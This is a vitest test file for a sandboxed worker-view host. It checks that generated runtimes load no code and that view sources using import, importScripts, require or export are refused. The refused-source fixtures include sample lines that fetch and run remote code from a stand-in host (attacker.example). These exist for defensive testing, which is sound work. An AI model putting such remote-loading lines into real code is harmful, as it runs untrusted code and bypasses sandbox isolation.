import { readFileSync } from "node:fs";
import { Script } from "node:vm";
import { describe, expect, it } from "vitest";
// @ts-expect-error — a plain .mjs module of the scripts, with no declarations.
import { GENERATED, GENERATED_HEADLESS, headlessRuntimeModule, viewRuntimeModule } from "../../../../scripts/guest-view-runtime.mjs";
import { GUEST_BUNDLE_BANNER } from "../../src/build.js";
import { HEADLESS_RUNTIME } from "../../src/headless/runtime.generated.js";
import { VIEW_RUNTIME } from "../../src/host/view-runtime.generated.js";
import { checkViewSource, viewScript } from "../../src/host/view-source.js";

/**
 * A VIEW NEEDS NO BUILD (FR-96). A chat writes a worker view as one plain
 * script against the `graview` global, and the host makes a worker of it:
 * the runtime, which it holds as one classic script, then the view. A
 * source that says `import` anywhere is refused, because `import()` is the
 * one way a hardened worker has left to load code and it cannot be spelled
 * any other way. That the skill's two examples and the package lens run
 * this way in Chromium, WebKit and Firefox is `guest-sandbox
 * --transport=plain`.
 */
const read = (path: string) => readFileSync(new URL(`../../../../${path}`, import.meta.url), "utf8");
const EXAMPLES = ["packages/skills/skills/graview-worker-view/examples/offers-list.js", "packages/skills/skills/graview-worker-view/examples/front-page.js", "scripts/fixtures/views/packages.js", "scripts/fixtures/views/notes.js"];

describe("the runtime the host holds", () => {
  it("is current with the runtime's source (pnpm guest:runtime)", async () => {
    expect(readFileSync(GENERATED, "utf8")).toBe(await viewRuntimeModule(GUEST_BUNDLE_BANNER));
  });

  it("is one strict classic script that loads nothing", () => {
    expect(() => new Script(VIEW_RUNTIME)).not.toThrow();
    expect(VIEW_RUNTIME.startsWith('"use strict";')).toBe(true);
    expect(VIEW_RUNTIME).not.toMatch(/\bimport\s*\(|\bimportScripts\b/);
  });

  it("and a headless run's (FR-95) is current with its source too, one strict classic script that loads nothing", async () => {
    expect(readFileSync(GENERATED_HEADLESS, "utf8")).toBe(await headlessRuntimeModule(GUEST_BUNDLE_BANNER));
    expect(() => new Script(HEADLESS_RUNTIME)).not.toThrow();
    expect(HEADLESS_RUNTIME.startsWith('"use strict";')).toBe(true);
    expect(HEADLESS_RUNTIME).not.toMatch(/\bimport\s*\(|\bimportScripts\b/);
  });
});

describe("a view's source", () => {
  for (const path of EXAMPLES) {
    it(`may run as it is written: ${path}`, async () => {
      const source = read(path);
      expect(checkViewSource(source)).toEqual([]);
      const script = await viewScript(source);
      expect(() => new Script(script)).not.toThrow();
    });
  }

  const refused: Record<string, string> = {
    "import() of an address": `graview.onProps(() => import("https://attacker.example/x.js"));`,
    "import() of a string built at run time": `const where = "https://attacker.example/" + "x.js"; import(where);`,
    "the word in a string": `const said = "import"; graview.render(said);`,
    "the word in a comment": `// import nothing\ngraview.render("x");`,
    "an import statement": `import { x } from "y";`,
    "importScripts": `importScripts("https://attacker.example/x.js");`,
    "an export": `export default function draw() {}`,
    "require()": `const x = require("y");`,
  };
  for (const [name, source] of Object.entries(refused)) {
    it(`is refused, with why, for ${name}`, () => {
      const findings = checkViewSource(source);
      expect(findings.length).toBeGreaterThan(0);
      for (const finding of findings) expect(finding).toMatch(/^It /);
    });
  }

  it("runs after the runtime, in a strict function of its own", async () => {
    const script = await viewScript("graview.render('x');");
    expect(script.startsWith(VIEW_RUNTIME)).toBe(true);
    expect(script.slice(VIEW_RUNTIME.length)).toBe(`\n;(function () {\n"use strict";\ngraview.render('x');\n})();\n`);
  });
});
